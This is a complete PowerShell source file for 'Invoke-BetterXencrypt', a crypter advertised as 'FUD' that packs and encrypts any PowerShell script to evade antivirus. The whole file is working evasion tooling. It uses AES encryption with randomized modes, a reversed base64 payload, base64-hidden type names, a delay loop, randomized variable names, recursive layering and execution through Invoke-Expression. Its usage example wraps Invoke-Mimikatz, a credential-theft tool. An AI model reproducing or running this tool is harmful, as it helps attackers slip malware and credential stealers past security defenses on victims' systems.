Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function Create-Var() {
        #Variable length help vary the length of the file generated
        #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
        $set = "abcdefghijkmnopqrstuvwxyz"
        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 5 -Maximum $set.Length)] } ) -join ''
}

function Invoke-BetterXencrypt {
    <#
    .SYNOPSIS
    Invoke-BetterXencrypt is a better version of Xencrypt Powershell crypter,cause Xencrypt is not FUD anymore,i recode the stub and "big bang boom",voila!Its FUD again
    If you dont know what Xencrypt is,Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.
    .DESCRIPTION
     ____       _   _          __  __                                _   
    | __ )  ___| |_| |_ ___ _ _\ \/ /___ _ __   ___ _ __ _   _ _ __ | |_ 
    |  _ \ / _ \ __| __/ _ \ '__\  // _ \ '_ \ / __| '__| | | | '_ \| __|
    | |_) |  __/ |_| ||  __/ |  /  \  __/ | | | (__| |  | |_| | |_) | |_ 
    |____/ \___|\__|\__\___|_| /_/\_\___|_| |_|\___|_|   \__, | .__/ \__|
                                                         |___/|_|       
    ----------------------------------------------------------------------
    [-----------------Your Lovely FUD Powershell Crypter-----------------]
    [-----------------Recoded With Love By GetRektBoy724-----------------]
    [------------------https://github.com/GetRektBoy724------------------]
     Invoke-BetterXencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
     Not only that,Invoke-BetterXencrypt-ed script can bypass any behavior monitoring from AVs
    .PARAMETER InFile
    Specifies the script to encrypt.
    .PARAMETER OutFile
    Specifies the output script.
    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 2.
    .EXAMPLE
    PS> Invoke-BetterXencrypt -InFile Invoke-Mimikatz.ps1 -OutFile banana.ps1 -Iterations 3
    .LINK
    https://github.com/GetRektBoy724/BetterXencrypt
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 2
    )
    Process {
        $banner = @"
 ____       _   _          __  __                                _   
| __ )  ___| |_| |_ ___ _ _\ \/ /___ _ __   ___ _ __ _   _ _ __ | |_ 
|  _ \ / _ \ __| __/ _ \ '__\  // _ \ '_ \ / __| '__| | | | '_ \| __|
| |_) |  __/ |_| ||  __/ |  /  \  __/ | | | (__| |  | |_| | |_) | |_ 
|____/ \___|\__|\__\___|_| /_/\_\___|_| |_|\___|_|   \__, | .__/ \__|
                                                     |___/|_|       
----------------------------------------------------------------------
[-----------------Your Lovely FUD Powershell Crypter-----------------]
[-----------------Recoded With Love By GetRektBoy724-----------------]
[------------------https://github.com/GetRektBoy724------------------]
"@
        Write-Output "$banner"
        # read
        Write-Output "[*] Reading '$($infile)' ..."
        $codebytes = [System.IO.File]::ReadAllBytes($infile)


        for ($i = 1; $i -le $iterations; $i++) {
            # Decide on encryption params ahead of time 
            
            Write-Output "[*] Starting code layer  ..."
            $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermodes = 'ECB','CBC'
            $ciphermode = $ciphermodes | Get-Random

            $keysizes = 128,192,256
            $keysize = $keysizes | Get-Random

            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = "Deflate"

            # compress
            Write-Output "[*] Compressing ..."
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
            $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Output "[*] Generating encryption key ..."
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            if ($ciphermode -eq 'CBC') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            } elseif ($ciphermode -eq 'ECB') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
            }

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }

            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Output "[*] Encrypting ..."
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)

            #reverse base64 encrypted for obfuscation ;)
            $reversingb64encrypted = $b64encrypted.ToCharArray()
            [array]::Reverse($reversingb64encrypted)
            $b64encryptedreversed = -join($reversingb64encrypted)
        
            # write
            Write-Output "[*] Finalizing code layer ..."

            # now, randomize the order of any statements that we can to further increase variation

            $stub_template = ''

            $code_alternatives  = @()
            $code_alternatives += '${19} = 0' + "`r`n"
            $code_alternatives += '${20} = 50000000' + "`r`n" 
            $code_alternatives += 'For (${19}=0; ${19} -lt ${20}) {17} ${19}++ {18}' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${11} = "{0}"' + "`r`n"
            $code_alternatives += '${9} = ${11}.ToCharArray()' + "`r`n"
            $code_alternatives += '[array]::Reverse(${9})' + "`r`n"
            $code_alternatives += '${10} = -join(${9})' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${2} = [System.Convert]::FromBase64String("${10}")' + "`r`n"
            $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
            #aes managed but its base64 encoded ;)
            $code_alternatives += '${12} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNNYW5hZ2VkCg=="))' + "`r`n"
            $code_alternatives += '${4} = New-Object "${12}"' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            #ciphermode but its base64 encoded ;)
            if ($ciphermode -eq "ECB") {
                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQg=="))' + "`r`n"
                $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
            }elseif ($ciphermode -eq "CBC") {
                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQw=="))' + "`r`n"
                $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
            }
            #paddingmode but its base64 encoded ;)
            if ($paddingmode -eq 'PKCS7') {
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpQS0NTNw=="))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'ISO10126') {
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpJU08xMDEyNg=="))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'ANSIX923') {
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpBTlNJWDkyMw=="))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'Zeros') {
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcw=="))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            }
            $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
            $code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
            $code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
            $stub_template += $code_alternatives -join ''


            if ($compressiontype -eq "Gzip") {
                $stub_template += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
            }
            $stub_template += '${5}.CopyTo(${7})' + "`r`n"

            $code_alternatives  = @()
            $code_alternatives += '${5}.Close()' + "`r`n"
            $code_alternatives += '${4}.Dispose()' + "`r`n"
            $code_alternatives += '${6}.Close()' + "`r`n"
            $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
            
        
            # it's ugly, but it beats concatenating each value manually.
            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var)
            $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        }
        Write-Output "[*] Writing '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Output "[+] Done!"
    }
}
